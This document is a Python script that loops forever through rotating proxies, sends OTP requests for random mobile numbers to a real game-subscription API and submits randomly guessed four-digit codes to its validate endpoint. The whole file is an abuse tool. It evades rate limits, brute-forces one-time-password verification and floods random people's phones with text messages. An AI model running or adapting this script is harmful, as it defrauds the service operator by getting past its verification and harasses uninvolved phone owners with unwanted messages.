import requests
import json
import random
import time

# Example of a public proxy list URL
proxy_list_url = './output.txt'

api_url = 'https://api.ktgamez.com/ooredoo/send-otp'
numbers_file_path = './numbers.json'
response_file_path = './response.json'

max_retries = 3  # Maximum number of retries

def get_random_proxy(proxy_list_url):
    with open(proxy_list_url, 'r') as proxy_file:
        proxy_list = proxy_file.read().splitlines()

    random_proxy = random.choice(proxy_list)
    return {
        'http': 'http://' + random_proxy,
        'https': 'http://' + random_proxy
    }

def generate_random_mobile_number():
    return str(random.randint(10000000, 99999999))

def generate_random_otp():
    return str(random.randint(1000, 9999))

def make_request_with_random_proxy(api_url, proxy):
    for retry in range(max_retries):
        new_mobile_number = generate_random_mobile_number()
        new_otp = generate_random_otp()

        response_arr = {
            'mobile': new_mobile_number,
            'otp': new_otp
        }

        try:
            with open(numbers_file_path, 'r') as numbers_file:
                numbers_data = json.load(numbers_file)

            if new_mobile_number in numbers_data:
                print('Duplicate number. Generating a new one...')
                return

            numbers_data.append(new_mobile_number)
            with open(numbers_file_path, 'w') as numbers_file:
                json.dump(numbers_data, numbers_file, indent=4)

            response = requests.post(api_url, json={'mobile': new_mobile_number}, proxies=proxy, timeout=10)  # Adjust the timeout as needed
            print('Response send-otp:', response.json())
            response_arr['send-otp'] = response.json()

            if response.json().get('statusCode') == '200':
                validate_object = {
                    'mobile': new_mobile_number,
                    'otp': new_otp,
                    'transId': response.json()['body']['transId']
                }

                try:
                    response2 = requests.post('https://api.ktgamez.com/ooredoo/validate-otp', json=validate_object, proxies=proxy, timeout=10)  # Adjust the timeout as needed
                    print(response2.json())
                    response_arr['validate-otp'] = response2.json()
                except requests.exceptions.RequestException as err:
                    response_arr['validate-otp'] = str(err)
                    print('Request error: validate-otp', err)
        except Exception as error:
            response_arr['send-otp'] = str(error)
            print('Request error:', error)

        with open(response_file_path, 'r') as response_file:
            response_data = json.load(response_file)

        response_data.append(response_arr)
        with open(response_file_path, 'w') as response_file:
            json.dump(response_data, response_file, indent=4)

        time.sleep(10)  # Sleep for 10 seconds

def main():
    while True:
        random_proxy = get_random_proxy(proxy_list_url)

        # Convert the proxy dictionary to a string before concatenating
        http_proxy = random_proxy['http']
        https_proxy = random_proxy['https']

        proxy = {
            'http': http_proxy,
            'https': https_proxy
        }

        make_request_with_random_proxy(api_url, proxy)

if __name__ == '__main__':
    main()
